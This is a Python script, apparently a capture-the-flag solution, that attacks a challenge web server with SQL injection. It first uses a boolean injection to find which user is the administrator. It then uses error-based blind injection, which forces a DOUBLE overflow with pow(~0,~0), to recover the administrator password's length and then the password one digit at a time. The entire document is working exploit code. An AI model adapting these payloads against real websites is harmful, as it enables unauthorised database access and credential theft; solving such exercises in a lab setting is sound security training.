import requests

URL = "http://sqli103.sstf.site"
SURVEY_URI = "/survey.php"
CHECK_ID_URI = "/check_id.php"

USER_ID_LIST = ['alpha', 'beta', 'gamma', 'delta', 'epsilon',
                'zeta', 'eta', 'theta', 'iota', 'kappa', 'lambda',
                'admin', 'notadmin']

PAYLOAD_IS_ADMIN = "' and is_admin=1 -- -"
PAYLOAD_CHECK_PW_LENGTH01 = "if((select length(pw) from member where user_id='"
PAYLOAD_CHECK_PW_LENGTH02 = "')="
PAYLOAD_CHECK_PW_LENGTH03 = ", pow(~0, ~0), 0)"

PAYLOAD_GET_PW01 = "if((select substr(pw, "
PAYLOAD_GET_PW02 = ", 1) from member where user_id='"
PAYLOAD_GET_PW03 = "')="
PAYLOAD_GET_PW04 = ", pow(~0, ~0), 0)"

ADMIN = None
PW_LENGTH = None
PW = ""

# Get Administrator ID
for elem in USER_ID_LIST:
    CHECK_ID_DATA = {'id': elem + PAYLOAD_IS_ADMIN}
    resp = requests.get(URL + CHECK_ID_URI, params=CHECK_ID_DATA)

    if(resp.text.find('{"exist":true}') > -1):
        ADMIN = elem
        print('Administrator is ' + ADMIN)

# Get PW Length of Administrator
for i in range(10):
    PAYLOAD = PAYLOAD_CHECK_PW_LENGTH01 + ADMIN
    PAYLOAD += PAYLOAD_CHECK_PW_LENGTH02 + str(i)
    PAYLOAD += PAYLOAD_CHECK_PW_LENGTH03

    CHECK_PW_LENGTH_DATA = {'answer': PAYLOAD}
    resp = requests.get(URL + SURVEY_URI, params=CHECK_PW_LENGTH_DATA)

    if(resp.text.find('DOUBLE') > -1):
        PW_LENGTH = i
        print('PW Length is ' + str(i))

# Get PW of Administrator
for idx in range(1, PW_LENGTH + 1):
    for i in range(10):
        PAYLOAD = PAYLOAD_GET_PW01 + str(idx)
        PAYLOAD += PAYLOAD_GET_PW02 + ADMIN
        PAYLOAD += PAYLOAD_GET_PW03 + str(i)
        PAYLOAD += PAYLOAD_GET_PW04

        GET_PW_DATA = {'answer': PAYLOAD}
        resp = requests.get(URL + SURVEY_URI, params=GET_PW_DATA)

        if(resp.text.find('DOUBLE') > -1):
            PW += str(i)
            break

print('PW of Administrator is ' + PW)